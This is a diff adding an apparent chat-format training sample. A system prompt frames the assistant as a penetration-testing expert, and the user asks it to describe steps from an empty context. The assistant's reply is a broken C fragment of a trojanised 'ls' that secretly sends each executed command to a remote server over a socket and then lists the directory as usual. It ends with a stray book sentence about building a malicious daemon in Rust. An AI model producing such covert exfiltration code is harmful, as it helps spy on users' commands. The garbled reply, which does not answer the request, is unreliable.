@@ -1,0 +1,30 @@
+system
+You are a cybersecurity and penetration testing expert inside a live operator console.
+user
+Describe the steps or process outlined in the following text: (Context: from Document)
+
+Context:
+Source: Unknown
+Section: General
+Pages: N/A
+assistant
+if (connect(sockfd, (struct sockaddr *)&serv_addr,
+{
+send(sockfd, user_command, strlen(user_command)
+close(sockfd);
+}
+}
+int main(int argc, char *argv[]) {
+char command[1024] = {0};
+for (int i = 0; i < argc; i++) {
+strcat(command, argv[i]);
+strcat(command, " ");
+}
+// Log and send the executed command
+log_and_send(command);
+// Execute original ls functionality
+list_directory();
+return 0;
+}
+Example 6-18 shows how to create a malicious daemon in Rust. Rust
+provides strong safety guarantees and a modern development environment,
